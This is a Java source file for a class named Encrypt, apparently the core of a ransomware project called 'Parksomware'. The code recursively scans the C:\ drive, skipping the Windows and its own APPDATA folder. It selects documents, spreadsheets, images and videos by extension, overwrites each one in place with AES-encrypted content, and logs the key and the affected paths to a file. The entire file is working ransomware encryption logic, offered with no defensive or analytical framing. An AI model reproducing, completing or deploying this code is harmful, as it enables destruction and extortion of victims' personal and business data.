package kr.pah;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.FileSystemException;
import java.nio.file.Files;
import java.util.*;

public class Encrypt {

    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
    private static final String[] EXTENSIONS = new String[]{".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv"};
    private static final String[] EXCLUDED_FOLDERS = new String[]{
            "C:\\Windows",
            System.getenv("APPDATA") + "\\Parksomware"
    };

    public static void runEncryption() throws Exception {
        List<File> filesToEncrypt = new ArrayList<>();
        File root = new File("C:\\");

        collectFiles(root, filesToEncrypt);

        Collections.sort(filesToEncrypt, Comparator.comparingInt(file -> file.getPath().length()));
        Collections.reverse(filesToEncrypt);

        List<String> encryptedFiles = new ArrayList<>();

        for (File file : filesToEncrypt) {
            try {
                encryptFile(file);
                encryptedFiles.add(file.getAbsolutePath());
            } catch (FileSystemException e) {
                System.out.println("FileSystemException = " + e.getFile());
            }
        }

        try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\Parksomware\\encrypted.txt")) {
            writer.write(KEY + System.lineSeparator());
            for (String filePath : encryptedFiles) {
                writer.write(filePath + System.lineSeparator());
            }
        }
    }

    private static void collectFiles(File directory, List<File> files) {
        String dirPath = directory.getAbsolutePath().toLowerCase();

        for (String excludedFolder : EXCLUDED_FOLDERS) {
            if (dirPath.startsWith(excludedFolder.toLowerCase())) {
                return;
            }
        }

        File[] found = directory.listFiles();
        if (found != null) {
            for (File file : found) {
                if (file.isDirectory()) {
                    collectFiles(file, files);
                } else {
                    for (String extension : EXTENSIONS) {
                        if (file.getName().toLowerCase().endsWith(extension)) {
                            files.add(file);
                            break;
                        }
                    }
                }
            }
        }
        System.out.println("found = " + Arrays.toString(found));
    }

    private static void encryptFile(File file) throws Exception {
        byte[] fileContent = Files.readAllBytes(file.toPath());
        byte[] encryptedContent = encrypt(fileContent);
        Files.write(file.toPath(), encryptedContent);
    }

    private static byte[] encrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }
}
